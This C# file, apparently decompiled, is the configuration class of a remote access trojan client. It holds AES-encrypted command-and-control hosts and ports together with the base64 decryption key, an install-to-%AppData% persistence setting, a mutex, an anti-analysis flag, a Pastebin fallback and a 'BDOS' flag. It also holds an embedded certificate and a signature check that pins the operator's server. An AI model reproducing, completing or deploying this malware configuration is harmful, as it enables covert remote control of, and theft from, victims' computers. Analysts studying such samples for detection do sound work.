using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Ports = "afxs9IVPmM0dONUanViRwjrYCHshaqgSLzRQS4h9h9TTmBbTS9D1DBCnqbr/X0G2+w4XNBfg/94IZyr6c2K2Sg==";

	public static string Hosts = "DXbnhxaHjM+zkyMn+DIh4vbta0vvcYkDwhPCAjex0ToWbu+Sb/XxsVIvWQEqU6a+j8XyZunOp0SbwNWKOdeeUA==";

	public static string Version = "FoIHIQSibjDyvTXkxm0LFFENi/lHJM68thk55mb3E2wlDX6PMGEirY+DaudHU3x9tHsR+oKOHBNClia7wWM5bA==";

	public static string Install = "yJdMg3O2jwMc0dwujoVO96qnplyB5evUOfD87YiFhNSi3k/Rh26CPwXTsOLyQLX8GdZ399n400OB43fEZILaTg==";

	public static string InstallFolder = "%AppData%";

	public static string InstallFile = "";

	public static string Key = "MDZCTGgzT0ZSQ0pwQ3hEWjNic0JxOXhScnFkMjZRNDE=";

	public static string MTX = "8flpzBqORCZUIQ6cxZDpADGsDtZnFhLXaTE+SPT+khePQ756CRePMbb4EBC9ufMcZNbSY+2sQb4vaHWAG7gyOA==";

	public static string Certificate = "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";

	public static string Serversignature = "gdmL9Y8i32+WCdLId1Re+FH9FAQNO5+NTrfqVbCOfdVI6YByDrYpvf+RPVKuDVf+wfCOvyLECFQcgC+cO3R6dyQ4BAorvV+WpS7xWCN9L3D2a0eufUkplVj03LadDV/GUJ551vhezpqh7swGfDYrcIWcrInDqf3SiQoP20RY+m9AfHbeGST/5V+zpImlqexKg7bcmK5s9XZxIdrCdpnOzmjV25NPbPkFBGAHoeP09krxF0dV1QddM/EYWLVcBQC1kve+1HIKv1a0vaTdtFGz40pxyZsTyWRTkFpX0IQAcLU0/CPz6n6/UTVyHeot+aUJtjJmK43Ky7f3Gf1Qd5eoB1+aAdB1OxrqPsqWdNxoAgrncd+mW/OVdOeaZzIeIseK36v0HWM+rJY7NG9A5y1nPg1fxk0Ukw0BRsePuZ+IkYqeAHWhSgZ8ych3pb3D7cTR6uvAsif53eH7BzVQYmIr+JOLYfzgM0VN7iR+enoIFn+5I7589byEIVM+zDQX8GhvP8t1dovAjUgD/bVGRjfLcdcTvVAHRqr5oswrP7cWCyHfOBqUZX1DkOTc+Dj/fuxr1zjhBa0disCTlQiiFaXoBbaNxFG+i594lvl4DuvBLT3H+t2lNYe8ywM3sEp25qDB0d51UE+YoRpl8cai1AEanzyxeVW9eDURlmWeCa0rjD3fkMIEQD6yuToiW/GlPGbIG6Sgs1r5aFNYQ+mLH+kMdELoHr7LW0RBjumnAdSNqrPzCX221ki3muqM8zrb7Rhaa8nGWrrsjoh+DWqMI1FBWunehkd65deUNtHSdmAR3pDk7Rd7UHsm/vkXkQfmzVTmoz492EwtoQvPPrtzDudFkrR6iyzR0mGAKZ7P9m6wSJvN8S1SEb/DuhIxNLW/+6og2hK3ILrC7u1q0zdUrLDIcaruDjplVsKZsT0cA9gFDR9nsxBJAfzLFueA66p6a8N8yIJqJITz/KUpTKN6vj5W+w==";

	public static X509Certificate2 ServerCertificate;

	public static string Anti = "tgg2XWPVLH0wrhTT3x+9NKGPZxazN53vIUDSyV0Q2F5QW9scsitrH93Nk4lNDek5daPmhOa1TQ6iiU82jyRqMA==";

	public static Aes256 aes256;

	public static string Pastebin = "7SuAbDSkzpNTInRYPSSeV9SOY2Ec5eDCsNO0q6xD2J6eIXZKvldJid1xYtFHFirfu0E6pGQNwFaqvhUPYyrKug==";

	public static string BDOS = "A2XsQRwyWiOF+bfrYVIcNqDzk0E9+s6p48zih8T0kHvlrUU30anp+cmKVWr72QFkyxNWIuYL6YzHd4CFFcZZ4A==";

	public static string Hwid = null;

	public static string Delay = "3";

	public static string Group = "SSXY/U1AA7+wFvLCwN0YVn3m9MePYtgRZ4JxQXMI3/5P6MxdFXiH/gTq3UUsaF1h0ixzQHasGGo9hCYnMFel0Q==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Ports = aes256.Decrypt(Ports);
			Hosts = aes256.Decrypt(Hosts);
			Version = aes256.Decrypt(Version);
			Install = aes256.Decrypt(Install);
			MTX = aes256.Decrypt(MTX);
			Pastebin = aes256.Decrypt(Pastebin);
			Anti = aes256.Decrypt(Anti);
			BDOS = aes256.Decrypt(BDOS);
			Group = aes256.Decrypt(Group);
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
